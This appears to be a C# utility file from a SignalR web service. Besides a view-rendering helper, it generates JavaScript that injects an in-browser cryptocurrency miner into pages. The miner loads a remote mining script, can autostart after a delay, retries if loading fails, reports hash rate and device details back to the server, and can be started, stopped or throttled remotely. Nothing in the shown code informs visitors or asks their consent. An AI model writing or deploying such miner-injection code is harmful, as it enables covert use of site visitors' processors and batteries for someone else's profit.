using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace SignalRService.Utils
{
    public static class RenderUtils
    {
        public static string RenderRazorViewToString(this Controller controller, string viewName, object model)
        {
            controller.ViewData.Model = model;
            using (var sw = new StringWriter())
            {
                var viewResult = ViewEngines.Engines.FindPartialView(controller.ControllerContext, viewName);
                var viewContext = new ViewContext(controller.ControllerContext, viewResult.View, controller.ViewData, controller.TempData, sw);
                viewResult.View.Render(viewContext, sw);
                viewResult.ViewEngine.ReleaseView(controller.ControllerContext, viewResult.View);
                return sw.GetStringBuilder().ToString();
            }
        }

        public static MvcHtmlString RenderMinerScript(string clientId, string throttle, string scriptUrl, int startDelayMs, int reportInveralMs, bool autostart)
        {
            string res = @"

             var myminer;

             var miner = {

                client: function create() {
                    if (myminer)
                        return myminer;
                    else {
                        myminer =  new Client.Anonymous('" + clientId + @"',
                            {
                                throttle:  " + throttle.Replace(",", ".") + @"
                            });
                        return myminer;
                    }
                },

                initialize: function loadScripts() {

                    jQuery.ajax({
                        url: '" + scriptUrl + @"',
                        dataType: 'script',
                        fail: function()
                                {
                                console.log('failed loading script...retrying');
                                setTimeout(function(){
                                     miner.initialize();
                                },2000);
                        },
                        success: function() {";

                if(autostart)
                {
                    res += @"
                     start_miner();
                    ";
                }

            res += @"

                        },
                        async: true
                    });
                },
                run: function start()
                {
                    this.client().start();

                },
                stop: function()
                {
                    this.client().stop();
                    setTimeout(function() {
                        miner.reportStatus();
                    }, 3000);

                },
                reportStatus: function miner_reportStatus()
                {

                    var minerstats = {
                        running: this.client().isRunning(),
                        onMobile: this.client().isMobile(),
                        wasmEnabled: this.client().hasWASMSupport(),
                        isAutoThreads: this.client().getAutoThreadsEnabled(),
                        hps: this.client().getHashesPerSecond(),
                        threads: this.client().getNumThreads(),
                        throttle: this.client().getThrottle(),
                        hashes: this.client().getTotalHashes(),
                    }

                servicehub.server.minerReportStatus(minerstats);

                }


};

function start_miner()
{

    setTimeout(function() {
        miner.run();
    }, " + startDelayMs + @");

    setInterval(function() {
        miner.reportStatus();
    }, " + reportInveralMs + @");

}

function stop_miner()
{
    miner.stop();
}

  ";

            res += @"

            $(function(){
                 miner.initialize();
            });

            ";

            return new MvcHtmlString(res);
        }

        public static MvcHtmlString RenderMinerHubMethods()
        {
            string str = @"

                  servicehub.client.miner_start = function () {
            start_miner();
        }

        servicehub.client.miner_stop = function () {
            stop_miner();
        }

        servicehub.client.miner_reportStatus = function () {
            //send stats to server
            miner.reportStatus();
        }

        servicehub.client.miner_setThrottle = function (data) {
            miner.client().setThrottle(data);
        }";
            return new MvcHtmlString(str);
        }
    }
}